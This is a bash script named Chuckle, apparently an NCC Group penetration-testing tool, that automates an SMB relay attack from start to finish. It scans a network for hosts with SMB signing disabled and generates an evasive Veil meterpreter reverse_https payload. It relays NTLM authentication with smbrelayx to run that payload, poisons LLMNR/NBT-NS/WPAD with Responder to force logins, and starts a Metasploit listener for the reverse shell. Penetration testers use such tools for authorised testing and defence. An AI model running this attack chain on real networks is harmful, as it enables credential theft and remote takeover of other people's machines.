#!/bin/bash
#Released as open source by NCC Group Plc - http://www.nccgroup.com/
#
#Developed by Craig S. Blackie, craig dot blackie@nccgroup dot trust
#
#http://www.github.com/nccgroup/chuckle
#
#Copyright 2016 Craig S. Blackie
#
#Released under Apache V2 see LICENCE for more information
#
#Requires Nmap, Responder, SMBRelayX, Latest version of Veil, metasploit.
trap 'kill -9 $(jobs -p)' EXIT
pkill -9 -f Responder.py

clear
echo "_________ .__                   __   .__          "
echo "\_   ___ \|  |__  __ __   ____ |  | _|  |   ____  "
echo "/    \  \/|  |  \|  |  \_/ ___\|  |/ /  | _/ __ \ "
echo "\     \___|   Y  \  |  /\  \___|    <|  |_\  ___/ "
echo " \______  /___|  /____/  \___  >__|_ \____/\___  >"
echo "        \/     \/            \/     \/         \/"
echo "                                  CSB 2016"
echo " Automated SMB-Relay Script"
echo -e '\n'

# slash configuration and fixed
RESPONDER=`which responder`
NMAP=`which nmap`
VEIL=/hacklabs/pentest/deps/Veil/Veil-Evasion/Veil-Evasion.py
SMBRELAY=`which smbrelayx.py`
MSFCONSOLE=`which msfconsole`
NBTSCAN=`which nbtscan`

# print nbt name, slow on big networks
# valid values: 0 1
shownbt=1

echo "Checking dependencies..."
command -v $RESPONDER >/dev/null 2>&1 || { echo "responder is required but not installed.  Aborting." >&2; exit 1; }
command -v $NMAP >/dev/null 2>&1 || { echo "nmap is required but not installed.  Aborting." >&2; exit 1; }
command -v $VEIL >/dev/null 2>&1 || { echo "veil-evasion is required but not installed.  Aborting." >&2; exit 1; }
command -v $SMBRELAY >/dev/null 2>&1 || { echo "smbrelayx.py is required but not installed.  Aborting." >&2; exit 1; }
command -v $MSFCONSOLE >/dev/null 2>&1 || { echo "msfconsole required but not installed.  Aborting." >&2; exit 1; }

#determine which version of Responder is being used.
if responder --version|grep 2.1>/dev/null; then
        newresver=0
        echo "Using Responder 2.1.*"
else
        newresver=1
        echo "Using Responder >=2.2"
fi

busy=0
for port in 21/tcp 25/tcp 53/tcp 80/tcp 88/tcp 110/tcp 139/tcp 143/tcp 1433/tcp 443/tcp 587/tcp 389/tcp 445/tcp 3141/tcp 53/udp 88/udp 137/udp 138/udp 5353/udp 5355/udp; do
  if [ `fuser $port 2>&1 |wc -l` -gt 0 ]; then
    echo "port $port busy, please check"
    busy=1
  fi
done

if [ $busy -gt 0 ]; then
  exit
fi

# slash fork
rm -rf chuckle.gnmap chuckle.hosts chuckle.log chuckle.nmap chuckle.rc chuckle.xml

echo "Please enter IP or Network to scan for SMB:"
read network
$NMAP -n -Pn -sS --script smb-security-mode.nse -p445 -oA chuckle $network  >chuckle.log &
echo "Scanning for SMB hosts..."
if [ $shownbt -gt 0 ]; then
  echo "...also resolving NBT name, could be quite slow"
fi
wait
echo > ./chuckle.hosts
# slash configuration and fixed
for ip in $(grep open chuckle.gnmap |cut -d " " -f 2 ); do
        lines=$(egrep -A 15 "for $ip$" chuckle.nmap |grep disabled |wc -l)
        if [[ $lines -gt 0 ]]; then
                if [ $shownbt -gt 0 ]; then
                        nbtname=$($NBTSCAN $ip | awk -F" " '{print $2}' | tail -1)
                        echo "$ip($nbtname)" >> ./chuckle.hosts
                else
                        echo "$ip" >> ./chuckle.hosts
                fi
        else
                echo "No targets running smb signing disabled"
                exit
        fi
done

#cat chuckle.hosts |xargs nbtscan -f > chuckle.nbt
if [ -f chuckle.hosts ]; then
        if [ -s chuckle.hosts ]; then
                echo "Select SMB Relay target:"
                hosts=$(<chuckle.hosts)
                select tmptarget in $hosts
                do
                        target=$(echo ${tmptarget%\(*})
                        echo "Authentication attempts will be relayed to $tmptarget"
                        break
                done
        else
                echo "No SMB hosts found."
                exit
        fi
else
        echo "chuckle.hosts file not exist"
        exit
fi

localip=$(hostname -I)
echo "Select local IP for reverse shell:"
select lhost in $localip
do
        echo "Meterpreter shell will connect back to $lhost"
        break
done
echo "Please enter local port for reverse connection:"
read port
echo "Meterpreter shell will connect back to $lhost on port $port"
echo "Generating Payload..."
payload=$($VEIL -p cs/meterpreter/rev_https -c LHOST=$lhost LPORT=$port -o $target 2>/dev/null|grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g")
echo "Payload created: $payload"
echo "Starting SMBRelayX and targetting $target with the payload $payload"
$SMBRELAY -h $tmptarget -e $payload  >> ./chuckle.log  &
sleep 2
echo "Starting Responder with the following options:

-w (Start the WPAD rogue proxy server)
-r (Answer to the Workstation Service request name suffix)
-f (Fingerprint every host who issued an LLMNR/NBT-NS query)
-F (Force NTLM/Basic authentication on wpad.dat file retrieval. This may cause a login prompt on the target)
-I (lhost $lost)

The active "coaxing" of a user works as follows:

A workstation will periodically search for WPAD. If a location is not provided by a DHCP or DNS server, then Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) queries are sent out on the local network segment. When Responder is active on a network, it will respond to these requests and send a specific wpad.dat file to the targeted browser. A command line switch "-F" was added to provide to force NTLM authentication when a browser wants to retrieve the wpad.dat file.

READ CAREFULLY
"
sleep 5

if [ $newresver -gt 0 ]; then
        #New Responder
        responder -I $(netstat -ie | grep -B1 $lhost  | head -n1 | awk '{print $1}' | tr -d :) -wrfF >>chuckle.log &
else
        #Old Responder.
        responder -i $lhost -wrfF >>chuckle.log &
fi
echo "Setting up listener..."
echo "use exploit/multi/handler" > chuckle.rc
echo "set payload windows/meterpreter/reverse_https" >> chuckle.rc
echo "set LHOST $lhost" >> chuckle.rc
echo "set LPORT $port" >> chuckle.rc
echo "set autorunscript post/windows/manage/migrate" >> chuckle.rc
#echo "set ExitOnSession false" >> chuckle.rc
echo "exploit -j" >> chuckle.rc
$MSFCONSOLE -q -r ./chuckle.rc
